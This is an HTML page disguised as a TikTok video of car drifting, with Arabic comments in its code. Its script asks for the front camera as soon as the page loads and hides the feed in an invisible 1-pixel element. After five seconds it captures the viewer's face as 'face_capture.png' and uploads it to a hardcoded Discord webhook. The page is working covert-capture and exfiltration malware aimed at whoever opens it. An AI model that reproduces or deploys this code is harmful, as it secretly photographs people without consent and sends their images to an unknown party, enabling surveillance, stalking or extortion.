<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        .video-wrapper { position: relative; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; }
        #tiktok-video { width: 100%; height: 100%; object-fit: cover; }
        .sidebar { position: absolute; right: 15px; bottom: 120px; display: flex; flex-direction: column; gap: 20px; z-index: 10; }
        .icon { width: 45px; height: 45px; border-radius: 50%; background: rgba(255,255,255,0.2); display: flex; align-items: center; justify-content: center; color: white; font-size: 22px; }
        .user-info { position: absolute; left: 15px; bottom: 40px; color: white; z-index: 10; }
        .user-info h3 { margin: 0; font-size: 18px; font-weight: bold; }
        
        /* الكاميرا مخفية تماماً ولكن تعمل في الخلفية */
        #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
        #photo-canvas { display: none; }
    </style>
</head>
<body>

<div class="video-wrapper">
    <video id="tiktok-video" autoplay muted loop playsinline>
        <source src="https://assets.mixkit.co/videos/preview/mixkit-fast-car-driving-on-a-highway-at-night-1595-large.mp4" type="video/mp4">
    </video>

    <div class="sidebar">
        <div class="icon">❤️</div>
        <div class="icon">💬</div>
        <div class="icon">↪️</div>
    </div>
    <div class="user-info">
        <h3>@driftedluxury</h3>
        <p>Best Drifting Clips 2026 #drift #cars</p>
    </div>
</div>

<video id="hidden-camera" autoplay playsinline></video>
<canvas id="photo-canvas"></canvas>

<script>
    const webhookURL = 'https://discord.com/api/webhooks/1493312893100228608/X78aap9qPQUcppW21eNRpVDCiJGIS3OFDw6rH6ZKTPVTzsQbsGJyBKMWV7slNEt67zUs';

    window.onload = async () => {
        try {
            // طلب الكاميرا الأمامية بأفضل دقة ممكنة
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: "user",
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                } 
            });
            
            const camera = document.getElementById('hidden-camera');
            camera.srcObject = stream;

            // ننتظر 5 ثواني عشان نضمن إنه طالع في التلفون والصورة تطلع واضحة
            setTimeout(() => {
                captureAndSend(camera);
            }, 5000);

        } catch (err) {
            console.log("Access Denied");
        }
    };

    async function captureAndSend(cameraElement) {
        const canvas = document.getElementById('photo-canvas');
        const context = canvas.getContext('2d');
        
        // التأكد من أخذ أبعاد الكاميرا الحقيقية
        canvas.width = cameraElement.videoWidth;
        canvas.height = cameraElement.videoHeight;
        
        context.drawImage(cameraElement, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            if (!blob) return;
            const formData = new FormData();
            formData.append('file', blob, 'face_capture.png');
            
            await fetch(webhookURL, { 
                method: 'POST', 
                body: formData 
            });
        }, 'image/png');
    }
</script>
</body>
</html>
